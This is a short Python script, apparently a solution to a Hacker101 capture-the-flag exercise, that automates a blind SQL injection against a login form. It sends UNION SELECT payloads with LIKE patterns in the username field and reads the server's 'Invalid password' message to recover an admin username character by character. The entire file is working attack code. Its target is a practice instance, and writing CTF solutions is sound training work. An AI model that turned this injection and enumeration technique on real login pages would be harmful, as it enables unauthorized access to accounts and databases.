import requests

url = "https://ccc99530212ff9c4b67940e664fa77d2.ctf.hacker101.com/login"
chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
user = ""
session = requests.Session()
# Username enumeration
for i in range(10):
  for char in chars:
    payload = f"' UNION Select 'user' as username from admins where username like '{user}{char}%';"
    data = {
      "username": payload,
      "password": ""
    }
    response = session.post(url,data)
    if "Invalid password" in response.text:
      user += char
      print(f"Username:{user}",end='\r')
      break
print(f"Valid username:{user}")